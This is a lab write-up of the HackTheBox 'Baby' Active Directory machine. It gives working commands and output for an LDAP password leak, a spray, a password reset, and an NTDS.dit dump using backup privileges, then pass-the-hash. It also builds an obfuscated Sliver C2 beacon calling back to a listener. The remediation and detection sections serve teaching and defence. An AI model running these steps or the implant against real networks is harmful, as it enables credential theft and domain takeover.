---
layout: default
title: "HackTheBox - Baby"
---

# HackTheBox - Baby

**OS:** Windows Server 2022 (Active Directory)

Baby is a Windows Active Directory domain controller on the `baby.vl` domain. Anonymous
LDAP enumeration reveals an initial password stored in a user description field. Spraying
that password against domain accounts surfaces a second account with a forced password
change, which is reset via impacket's RPC-SAMR protocol to obtain WinRM access. The
foothold user is a member of Backup Operators, granting SeBackupPrivilege. That privilege
is leveraged to create a Volume Shadow Copy, extract NTDS.dit and the SYSTEM hive, and
dump the full domain hash table offline. The Administrator NTLM hash is used for
pass-the-hash to complete the box.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (BABYDC.baby.vl) |
| Initial Access | Anonymous LDAP description leak -> password spray -> RPC-SAMR password change -> WinRM |
| Privilege Escalation | Backup Operators / SeBackupPrivilege -> shadow copy -> NTDS.dit -> secretsdump -> PtH |
| Final Access | `baby\administrator` |

---

## Recon

### Port Scan

Standard domain controller fingerprint: DNS, Kerberos, LDAP/LDAPS, SMB, RPC, RDP,
WinRM, and ADWS. No unusual services.

```
$ nmap -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 --open <target-ip>

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl)
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: BABYDC; OS: Windows
```

| Port | Service | Notes |
|---|---|---|
| 53 | DNS | `baby.vl` |
| 88 | Kerberos | AS-REP / Kerberoast surface |
| 389 / 3268 / 636 / 3269 | LDAP / GC | anonymous bind permitted |
| 445 | SMB | signing required, null auth allowed |
| 464 | kpasswd | used for password change |
| 5985 | WinRM | foothold shell |
| 9389 | ADWS | |

### Anonymous LDAP Enumeration

LDAP permits unauthenticated binds. Querying all user objects with `ldapsearch` against
the base DN reveals the full domain user list and, critically, description fields:

```
$ ldapsearch -x -H ldap://<target-ip> -b "DC=baby,DC=vl" \
  "(description=*)" sAMAccountName description

[... standard group descriptions omitted ...]

description: Set initial password to BabyStart123!
sAMAccountName: Teresa.Bell
```

> **Why this works:** Anonymous LDAP binds are enabled by default on many AD installations
> and are not blocked here. Description fields are a common place for IT staff to note
> initial or temporary passwords, especially when no dedicated onboarding system exists.

Nine user accounts are visible via anonymous LDAP:

```
Ashley.Webb, Connor.Wilkinson, Guest, Hugh.George, Jacqueline.Barnett,
Joseph.Hughes, Kerry.Wilson, Leonard.Dyer, Teresa.Bell
```

> **Gotcha worth recording:** One domain user (Caroline.Robinson, the actual foothold
> account) was entirely absent from anonymous LDAP results -- her object has ACLs that
> restrict visibility to authenticated readers. Anonymous LDAP does not guarantee a
> complete user list; SMB RID-cycling can surface accounts that LDAP misses.

---

## Initial Access

### Password Spray

The initial password discovered in Teresa.Bell's description field (`BabyStart123!`) is
sprayed across all known users:

```
$ nxc smb <target-ip> -u users.txt -p 'BabyStart123!' --no-bruteforce

SMB  <target-ip>  445  BABYDC  [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE
[... all 8 LDAP-visible accounts return STATUS_LOGON_FAILURE ...]
```

None of the LDAP-visible accounts accept the password. However, testing the credential
directly against Caroline.Robinson (not returned by anonymous LDAP) reveals a different
status:

```
$ nxc smb <target-ip> -u Caroline.Robinson -p 'BabyStart123!'

SMB  <target-ip>  445  BABYDC  [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

> **Why this works:** `STATUS_PASSWORD_MUST_CHANGE` is distinct from
> `STATUS_LOGON_FAILURE` -- it means the credential is correct but a password change is
> required before the account can authenticate normally. Accounts with `pwdLastSet=0`
> (admin-forced "must change at next logon") return this status. The intended initial
> password was assigned to Caroline.Robinson, not Teresa.Bell, whose description was
> purely informational.

### Password Reset via RPC-SAMR

When `pwdLastSet=0`, the `SamrUnicodeChangePasswordUser2` RPC call accepts a null session
as the binding context, allowing an unauthenticated password change:

```
$ python3 /usr/share/doc/python3-impacket/examples/changepasswd.py \
  -protocol rpc-samr \
  -dc-ip <target-ip> \
  -newpass 'Pw**********' \
  'baby.vl/Caroline.Robinson:BabyStart123!@<target-ip>'

[*] Changing the password of baby.vl\Caroline.Robinson
[*] Connecting to DCE/RPC as baby.vl\Caroline.Robinson
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[*] Password was changed successfully.
```

> **Why this works:** The SAMR `ChangePasswordUser2` call path permits a null bind
> specifically to handle the must-change bootstrap case -- the user cannot authenticate
> to change their own password since they can't log in yet. This is by design in the
> protocol; it is not a vulnerability on its own, but a misconfigured initial-password
> workflow that exposes it is.

### WinRM Foothold

```
$ nxc winrm <target-ip> -u Caroline.Robinson -p 'Pw**********' \
  -x 'whoami; hostname'

WINRM  <target-ip>  5985  BABYDC  [+] baby.vl\Caroline.Robinson:Pw********** (Pwn3d!)
WINRM  <target-ip>  5985  BABYDC  [+] Executed command (shell type: powershell)
WINRM  <target-ip>  5985  BABYDC  baby\caroline.robinson
WINRM  <target-ip>  5985  BABYDC  BabyDC
```

```
$ nxc winrm <target-ip> -u Caroline.Robinson -p 'Pw**********' \
  -x 'type C:\Users\Caroline.Robinson\Desktop\user.txt'

WINRM  <target-ip>  5985  BABYDC  [+] Executed command (shell type: powershell)
WINRM  <target-ip>  5985  BABYDC  <user-flag-redacted>
```

---

## Post-Exploitation Enumeration

```
$ nxc winrm <target-ip> -u Caroline.Robinson -p 'Pw**********' -x 'whoami /priv'

WINRM  <target-ip>  5985  BABYDC  PRIVILEGES INFORMATION
WINRM  <target-ip>  5985  BABYDC  Privilege Name                Description                    State
WINRM  <target-ip>  5985  BABYDC  SeMachineAccountPrivilege     Add workstations to domain     Enabled
WINRM  <target-ip>  5985  BABYDC  SeBackupPrivilege             Back up files and directories  Enabled
WINRM  <target-ip>  5985  BABYDC  SeRestorePrivilege            Restore files and directories  Enabled
WINRM  <target-ip>  5985  BABYDC  SeShutdownPrivilege           Shut down the system           Enabled
WINRM  <target-ip>  5985  BABYDC  SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
WINRM  <target-ip>  5985  BABYDC  SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```
$ nxc winrm <target-ip> -u Caroline.Robinson -p 'Pw**********' \
  -x 'whoami /groups | findstr -i backup'

WINRM  <target-ip>  5985  BABYDC  BUILTIN\Backup Operators  Alias  S-1-5-32-551  Mandatory group, Enabled by default, Enabled group
```

Caroline.Robinson is a member of **Backup Operators**, granting `SeBackupPrivilege` and
`SeRestorePrivilege`. This allows reading any file on the system regardless of ACL,
including locked database files like NTDS.dit.

---

## Privilege Escalation

### SeBackupPrivilege: Shadow Copy + NTDS.dit Extraction

`SeBackupPrivilege` enables the `FILE_FLAG_BACKUP_SEMANTICS` flag on file opens, bypassing
DACL checks. The cleanest approach on a DC is to create a Volume Shadow Copy (bypassing
the live VSS lock on NTDS.dit) and use `robocopy /b` to copy the file out:

**Step 1 -- Create the diskshadow script:**

```
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> $lines = @(
  "set context clientaccessible",
  "set context persistent",
  "set metadata C:\Windows\Temp\meta.cab",
  "begin backup",
  "add volume c: alias mydrive",
  "create",
  "expose %mydrive% z:",
  "end backup"
)
$lines | Set-Content C:\Windows\Temp\shadow.dsh
```

**Step 2 -- Create the shadow copy and expose it as Z:\:**

```
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> diskshadow /s C:\Windows\Temp\shadow.dsh

Microsoft DiskShadow version 1.0
[...]
-> expose %mydrive% z:
-> %mydrive% = {63fabb8d-0dfd-4a68-b808-578a486a5942}
The shadow copy was successfully exposed as z:\.
-> end backup
```

**Step 3 -- Copy NTDS.dit and save the SYSTEM hive:**

```
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> robocopy /b Z:\Windows\NTDS C:\Windows\Temp\ntdsdump ntds.dit

               Total    Copied   Skipped  Mismatch    FAILED    Extras
  Dirs :         1         1         0         0         0         0
 Files :         1         1         0         0         0         0
 Bytes :   16.00 m   16.00 m

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save HKLM\SYSTEM C:\Windows\Temp\system.hive /y

The operation completed successfully.
```

> **Why this works:** NTDS.dit is locked by the AD DS service at runtime and cannot be
> copied directly even by an Administrator. Volume Shadow Copy provides a consistent
> point-in-time snapshot of the volume with the lock released. `robocopy /b` (backup mode)
> invokes `SeBackupPrivilege` to bypass the file's DACL, which would otherwise block a
> non-admin read of the NTDS directory contents. Together these two primitives let
> Backup Operators members extract the domain database without touching LSASS or
> requiring DS-Replication rights.

### Offline Hash Extraction

Both files are downloaded to the attack box and processed offline:

```
$ impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<redacted-nt-hash>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:...:<redacted-nt-hash>:::
baby.vl\Ashley.Webb:1105:...:<redacted-nt-hash>:::
baby.vl\Hugh.George:1106:...:<redacted-nt-hash>:::
baby.vl\Leonard.Dyer:1107:...:<redacted-nt-hash>:::
baby.vl\Ian.Walker:1108:...:<redacted-nt-hash>:::
baby.vl\Connor.Wilkinson:1110:...:<redacted-nt-hash>:::
baby.vl\Joseph.Hughes:1112:...:<redacted-nt-hash>:::
baby.vl\Kerry.Wilson:1113:...:<redacted-nt-hash>:::
baby.vl\Teresa.Bell:1114:...:<redacted-nt-hash>:::
baby.vl\Caroline.Robinson:1115:...:<redacted-nt-hash>:::
```

### Pass-the-Hash to Administrator

```
$ nxc winrm <target-ip> -u Administrator -H <redacted-nt-hash> \
  -x 'type C:\Users\Administrator\Desktop\root.txt'

WINRM  <target-ip>  5985  BABYDC  [+] baby.vl\Administrator:<redacted-nt-hash> (Pwn3d!)
WINRM  <target-ip>  5985  BABYDC  [+] Executed command (shell type: cmd)
WINRM  <target-ip>  5985  BABYDC  <root-flag-redacted>
```

---

## Post-Exploitation: C2 (Sliver)

A Sliver HTTPS beacon was generated for the HTB implant pool (`~/engagements/_pool/htb/`)
and uploaded to `C:\Windows\Temp\beacon.exe` via SMB:

```
sliver > generate beacon --os windows --arch amd64 --protocol https \
  --c2 https://<lhost>:443 --interval 30 --jitter 10 \
  --evasion --obfuscate --name htb-win-beacon

[*] Generating new windows/amd64 beacon implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 2m14s

sliver > https --lport 443
[*] Starting HTTPS :443 listener ...
[*] Successfully started job #9
```

Execution was attempted via WinRM (`Start-Process`). The beacon did not check in.

**Why skipped:** Windows Defender real-time protection on Server 2022 intercepted the
executable before execution completed. Disabling Defender is out of scope for this
write-up's threat model (it requires explicit operator approval in automated mode).
The pool build (`htb-win-beacon.exe`) is retained for reuse on future HTB Windows boxes
where Defender is disabled or the evasion profile is sufficient.

---

## Root Cause

The box has two compounding weaknesses:

1. **Credential in LDAP description field.** The IT team stored an initial account
   password in a user's LDAP description attribute, readable by any unauthenticated
   LDAP client. Description fields are indexed and replicated; they are not a safe
   place for secrets.

2. **Backup Operators membership grants domain-wide secret access.** Caroline.Robinson's
   membership in Backup Operators provided `SeBackupPrivilege`, which is sufficient to
   extract NTDS.dit via shadow copy. Backup Operators is a highly-privileged built-in
   group and should be treated as equivalent to Domain Admins for access-control purposes.

---

## Impact

Full domain compromise. All domain account NTLM hashes were extracted offline, enabling:

- Pass-the-hash / pass-the-ticket to any account in the domain
- Persistence via golden/silver ticket (krbtgt hash obtained)
- Lateral movement to any domain-joined system using Administrator or service account hashes

---

## Remediation

Priority-ordered -- items higher on the list break the attack path outright:

1. **Remove credentials from LDAP description fields.** Audit all user and computer
   objects for description attributes containing password-like strings. Use a dedicated
   onboarding workflow that never stores initial passwords in directory attributes.

2. **Remove Caroline.Robinson (and all non-essential accounts) from Backup Operators.**
   Backup Operators membership should be limited to service accounts used exclusively
   for backup jobs, with those accounts not permitted interactive logon. Treat it as
   a tier-0 privileged group.

3. **Require a privileged access workstation (PAW) for Backup Operators members.**
   If Backup Operators membership is operationally required, members should authenticate
   only from a hardened, monitored workstation with network isolation from tier-1/2 systems.

4. **Restrict anonymous LDAP binds.** Configure `dsHeuristics` or use a firewall rule to
   block unauthenticated LDAP access from non-domain systems. Authenticated enumeration
   is harder to enumerate without alerting.

### Validation

| Fix | Validation command |
|---|---|
| No passwords in descriptions | `ldapsearch -x -H ldap://<dc> -b "DC=baby,DC=vl" "(description=*)" sAMAccountName description` -- confirm no credential-like strings |
| Backup Operators is empty | `net group "Backup Operators" /domain` -- confirm only approved service accounts |
| Anonymous LDAP blocked | `ldapsearch -x -H ldap://<dc> -b "DC=baby,DC=vl" "(objectClass=user)"` -- should return `Inappropriate Authentication` |

---

## Detection Opportunities

| Event | ID / Signal |
|---|---|
| Anonymous LDAP bind | Windows Security 4625 (failed logon) or LDAP server audit events if auditing is enabled; LDAP bind with no credentials from a non-domain IP |
| RPC-SAMR password change (null session) | Event 4723 (password change attempt) on the DC; source IP is the attacker's machine |
| Volume Shadow Copy creation | Event 4656 / 4663 (object access on the shadow copy provider) + `vssvc` events; diskshadow.exe spawned by a non-admin or non-backup process |
| robocopy /b against NTDS path | Process creation event (4688) with `robocopy.exe` and `NTDS` in the command line |
| Large file copy from ADMIN$ or C$ | SMB share audit: large file transfer from `C$\Windows\Temp` to an external IP |
| Pass-the-hash logon | Event 4624 logon type 3 with `NTLM` auth from an unexpected source IP for Administrator |

---

## Lessons Learned

- **Anonymous LDAP is a gold mine.** Description fields, password policy, and user
  enumeration are all available without credentials on default AD installs. Always
  check for credential-like strings in descriptions before doing anything else.

- **STATUS_PASSWORD_MUST_CHANGE != wrong password.** A spray that returns only
  `STATUS_LOGON_FAILURE` across LDAP-visible users does not rule out hidden accounts.
  Test the candidate password directly against usernames not returned by anonymous
  enumeration -- SMB will distinguish must-change from wrong password.

- **Backup Operators == DA for practical purposes.** The shadow-copy + robocopy /b
  path to NTDS.dit requires no special tooling, no LSASS touch, no DCSync rights, and
  leaves a lighter forensic footprint than a DCSync. Defenders who treat Backup Operators
  as a low-risk group are wrong.

- **RID-cycle supplements anonymous LDAP.** Caroline.Robinson was invisible to
  anonymous LDAP but reachable by direct testing. Production enumeration should pair
  LDAP with SMB RID-cycling to catch ACL-hidden accounts.

---

## Cleanup

All artifacts dropped on the target were removed before the machine was terminated:

```
*Evil-WinRM* PS C:\> Remove-Item C:\Windows\Temp\beacon.exe -Force
*Evil-WinRM* PS C:\> Remove-Item C:\Windows\Temp\ntdsdump -Recurse -Force
*Evil-WinRM* PS C:\> Remove-Item C:\Windows\Temp\system.hive -Force
*Evil-WinRM* PS C:\> Remove-Item C:\Windows\Temp\shadow.dsh,C:\Windows\Temp\meta.cab -Force
```

The Volume Shadow Copy created by diskshadow was persistent (created with `set context
persistent`); it was removed by the HTB instance termination. In a real engagement this
would require explicit cleanup via `vssadmin delete shadows /shadow={id}`.

No AD objects or ACLs were modified. Caroline.Robinson's password was changed as a
required step (no alternative without admin-level password reset); this is tracked in
the engagement notes.

The Sliver HTTPS listener (job #9) was killed at the end of the session. The `htb-win-beacon.exe`
implant build is retained in the pool at `~/engagements/_pool/htb/` for reuse on future
HTB Windows targets.
